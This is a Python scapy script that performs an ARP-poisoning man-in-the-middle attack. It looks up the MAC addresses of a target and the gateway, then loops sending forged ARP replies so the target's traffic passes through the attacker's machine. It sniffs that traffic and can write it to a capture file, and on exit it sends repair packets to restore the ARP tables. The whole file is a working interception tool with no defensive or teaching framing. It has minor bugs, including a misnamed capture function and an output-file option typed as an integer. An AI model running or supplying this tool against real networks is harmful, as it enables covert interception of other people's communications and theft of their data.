import os
import sys
import threading
import signal
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

BROADCAST = "ff:ff:ff:ff:ff:ff"

def get_mac(ip_address):
    global BROADCAST

    req_mac = Ether()/ARP()
    req_mac.op = 1 #request op code
    req_mac.dst = BROADCAST
    req_mac.pdst = ip_address

    ans, unans = srp(req_mac, retry = 10, timeout = 1)

    for req,res in ans:
        return res[Ether].src

    return None

def repair(gateway_ip, gateway_mac, target_ip, target_mac):
    global BROADCAST

    repair_gateway = Ether()/ARP()
    repair_gateway.op = 2 #reply op code
    repair_gateway.psrc = target_ip
    repair_gateway.pdst = gateway_ip
    repair_gateway.hwsrc = target_mac
    repair_gateway.hwdst = BROADCAST

    repair_target = Ether()/ARP()
    repair_target.op = 2
    repair_target.psrc = gateway_ip
    repair_target.pdst = target_ip
    repair_target.hwsrc = gateway_mac
    repair_target.hwdst = BROADCAST

    send(repair_gateway, count = 5)
    send(repair_target, count = 5)

def poison(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    while True:
        send(poison_target)
        send(poison_gateway)

        time.sleep(3)

    return

def signal_handler(signal, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

routes = conf.route.routes
default_route = routes[0]
if len(routes) > 1:
    default_route = routes[1]

parser = argparse.ArgumentParser()
parser.add_argument("target_ip", help="target ip address", type=str)
parser.add_argument("-g", "--gateway_ip", help="gateway ip address", type=str, default=default_route[2])
parser.add_argument("-i", "--network_interface", help="interface to to listen on (eth0, lo, etc)", type=str, default=default_route[3])
parser.add_argument("-o", "--output_file", help="output pcap file", type=int, default=None)
parser.add_argument("-p", "--packets", help="number of packets to mitm", type=int, default=None)
args = parser.parse_args()

interface = args.network_interface
target_ip = args.target_ip
gateway_ip = args.gateway_ip
packet_count = args.packets
output_file = args.output_file

conf.iface = interface
conf.verb = 0

print("Requesting gateway MAC address...")
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print ("ERROR: failed to resolve gateway MAC address")
    exit(1)
else:
    hostname = socket.gethostbyaddr(gateway_ip)[0]
    print("%s (%s) at %s on %s" % (hostname, gateway_ip, gateway_mac, interface))

print("Requesting target MAC address...")
target_mac = get_mac(target_ip)

if target_mac is None:
    print ("ERROR: failed to resolve target MAC address")
    exit(1)
else:
    hostname = socket.gethostbyaddr(target_ip)[0]
    print("%s (%s) at %s on %s" % (hostname, target_ip, target_mac, interface))

poison_thread = threading.Thread(daemon=True, target = poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

print("Poisoning target device...")

def success(packet):
    if not success.called:
        print("Recieveing traffic from target device!")
    success.called = True
success.called = False

try:
    packets = sniff(count=packet_count, prn=success, filter="ip host %s" % target_ip)

except KeyboardInterrupt:
    pass

finally:
    if output_file != None:
        wrcap(output_file, packets)

    poison_thread
    repair(gateway_ip, gateway_mac, target_ip, target_mac)

    sys.exit(0)
